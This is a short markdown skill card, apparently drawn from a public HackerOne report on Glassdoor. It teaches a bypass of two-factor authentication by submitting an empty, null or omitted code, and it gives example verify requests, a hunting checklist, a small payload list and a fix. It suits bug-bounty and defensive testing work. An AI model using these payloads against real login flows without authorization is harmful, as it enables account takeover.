---
name: 2fa-blank-code
description: 2FA bypass by submitting a blank/null/empty code. Teaches the simplest, highest-yield 2FA bypass and the "null/empty input" testing mindset for verification flows.
sources: hackerone_public
report_count: 1
---

# 2FA Bypass via Blank/Null Code

**Report**: Glassdoor — "2FA bypass by sending blank code" (#897385).

## Why it matters (the new lesson)
Many 2FA implementations fail open on empty input: `if (code === stored)` where an empty/`null`/`undefined` code matches because the *stored* value is also empty (e.g. user never fully enrolled, or a default). Always test blank/null/omitted codes — the most trivial input is often the one that slips through.

## How it works
```
POST /2fa/verify { code: "" }        → 200 (authenticated)
POST /2fa/verify { code: null }      → 200
POST /2fa/verify { }                 → 200
```

## How to hunt for it
1. On the 2FA prompt, submit empty string, `null`, `0`, `000000`, or omit the field.
2. Try `code[]=` (array), `code=%00`, negative/overflow values.
3. Confirm session is granted MFA-authenticated state.

## Payloads
```
code=
code=null
code=000000
code[]=
```

## Fix
Reject empty/missing codes; require a valid enrolled secret before comparing; `===` strict compare against server-stored TOTP; fail closed.
